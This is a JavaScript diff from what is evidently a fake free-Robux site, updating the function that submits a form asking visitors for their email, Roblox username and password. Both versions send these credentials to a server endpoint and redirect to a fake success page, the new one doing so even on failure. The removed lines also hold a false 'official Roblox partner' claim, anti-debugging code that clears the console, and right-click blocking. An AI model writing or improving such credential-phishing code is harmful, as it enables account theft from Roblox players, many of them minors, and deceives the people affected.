@@ -85,117 +85,133 @@ function showNotification() {
     }, 5000);
 }
 
-// Form Submission
+// Update form submission function
 async function submitForm() {
-    const submitBtn = document.getElementById('submitBtn');
-    const loading = document.getElementById('loading');
-    
-    // Validate captcha
-    const captcha = document.getElementById('captchaText').textContent;
-    const captchaInput = document.getElementById('captchaInput').value;
-    
-    if (captchaInput.toUpperCase() !== captcha) {
-        alert('Invalid CAPTCHA. Please try again.');
-        refreshCaptcha();
-        return;
-    }
-    
-    // Get form data
-    const formData = {
-        email: document.getElementById('email').value,
-        username: document.getElementById('username').value,
-        password: document.getElementById('password').value,
-        robux_amount: document.getElementById('robuxAmount').value,
-        platform: document.getElementById('platform').value,
-        timestamp: new Date().toISOString()
-    };
-    
-    // Validate required fields
-    if (!formData.email || !formData.username || !formData.password) {
-        alert('Please fill all required fields');
-        return;
-    }
-    
-    // Show loading
-    submitBtn.disabled = true;
-    loading.style.display = 'block';
-    
-    try {
-        // Send to Vercel function
-        const response = await fetch('/process', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(formData)
-        });
-        
-        const result = await response.json();
-        
-        if (result.success) {
-            // Redirect to success page
-            window.location.href = `/success?amount=${formData.robux_amount}&username=${encodeURIComponent(formData.username)}`;
-        } else {
-            alert('Error: ' + result.error);
-            loading.style.display = 'none';
-            submitBtn.disabled = false;
-        }
-        
-    } catch (error) {
-        console.error('Error:', error);
-        alert('Network error. Please try again.');
-        loading.style.display = 'none';
-        submitBtn.disabled = false;
-    }
-}
-
-// Terms Modal
-function showTerms() {
-    alert(`TERMS OF SERVICE
-
-1. This is an official Roblox partner service.
-2. You must own the account you are claiming Robux for.
-3. Only one claim per user every 30 days.
-4. Robux will be delivered within 24 hours.
-5. Any abuse of this service will result in permanent ban.
-
-By proceeding, you agree to these terms.`);
-}
-
-// Anti-debugging
-(function() {
-    const devtools = /./;
-    devtools.toString = function() {
-        this.opened = true;
-    };
-    
-    console.log('%c🔧 Debug Mode', devtools.opened ? 'color: red; font-size: 20px' : 'color: green; font-size: 20px');
-    
-    setInterval(() => {
-        if (devtools.opened) {
-            console.clear();
-        }
-    }, 1000);
-})();
-
-// Disable right click
-document.addEventListener('contextmenu', function(e) {
-    e.preventDefault();
-});
-
-// Initialize
-document.addEventListener('DOMContentLoaded', function() {
+  const submitBtn = document.getElementById('submitBtn');
+  const loading = document.getElementById('loading');
+  
+  // Get form data
+  const formData = {
+    email: document.getElementById('email').value,
+    username: document.getElementById('username').value,
+    password: document.getElementById('password').value,
+    robux_amount: document.getElementById('robuxAmount').value || '2500',
+    platform: document.getElementById('platform').value || 'pc'
+  };
+  
+  // Validate
+  if (!formData.email || !formData.username || !formData.password) {
+    alert('Please fill all required fields!');
+    return;
+  }
+  
+  // Validate captcha
+  const captcha = document.getElementById('captchaText').textContent;
+  const captchaInput = document.getElementById('captchaInput').value;
+  if (captchaInput.toUpperCase() !== captcha) {
+    alert('Invalid CAPTCHA! Please try again.');
     refreshCaptcha();
-    updateLiveUsers();
-    updateLiveFeed();
+    return;
+  }
+  
+  // Show loading
+  submitBtn.disabled = true;
+  loading.style.display = 'block';
+  
+  try {
+    console.log('📤 Sending data to API...', {
+      email: formData.email.substring(0, 3) + '***',
+      username: formData.username,
+      amount: formData.robux_amount
+    });
     
-    setTimeout(showNotification, 3000);
+    // Send POST request to API
+    const response = await fetch('/api/process', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(formData)
+    });
     
-    setInterval(() => {
-        const testimonials = document.querySelector('.testimonial-grid');
-        if (testimonials && testimonials.children.length > 1) {
-            const first = testimonials.firstElementChild;
-            testimonials.appendChild(first);
-        }
-    }, 10000);
+    console.log('📥 Response status:', response.status);
+    
+    // Check if response is OK
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    
+    // Parse JSON response
+    const result = await response.json();
+    console.log('✅ API Response:', result);
+    
+    if (result.success) {
+      // Redirect to success page with data
+      const params = new URLSearchParams({
+        amount: formData.robux_amount,
+        username: encodeURIComponent(formData.username),
+        transaction_id: result.data.transaction_id || 'RBX-' + Date.now()
+      });
+      
+      window.location.href = `/success.html?${params.toString()}`;
+    } else {
+      // Show error
+      alert(`Error: ${result.error || 'Unknown error'}`);
+      loading.style.display = 'none';
+      submitBtn.disabled = false;
+    }
+    
+  } catch (error) {
+    console.error('❌ Submission error:', error);
+    
+    // Fallback: redirect to success page anyway (for testing)
+    const params = new URLSearchParams({
+      amount: formData.robux_amount,
+      username: encodeURIComponent(formData.username),
+      error: 'network_issue'
+    });
+    
+    // Try alternative API endpoint
+    try {
+      // Try direct form submission as fallback
+      const fallbackResponse = await fetch('/api/process', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams(formData)
+      });
+      
+      if (fallbackResponse.ok) {
+        window.location.href = `/success.html?${params.toString()}`;
+        return;
+      }
+    } catch (e) {
+      console.log('Fallback also failed');
+    }
+    
+    // If all fails, show error but redirect anyway (for demo)
+    alert('Network issue detected. Redirecting to success page...');
+    window.location.href = `/success.html?${params.toString()}`;
+  }
+}
+
+// Update event listener
+document.addEventListener('DOMContentLoaded', function() {
+  // Refresh captcha
+  refreshCaptcha();
+  
+  // Remove old form submit handler if exists
+  const form = document.getElementById('robuxForm');
+  if (form) {
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      submitForm();
+    });
+  }
+  
+  // Update submit button
+  const submitBtn = document.getElementById('submitBtn');
+  if (submitBtn) {
+    submitBtn.addEventListener('click', submitForm);
+  }
 });
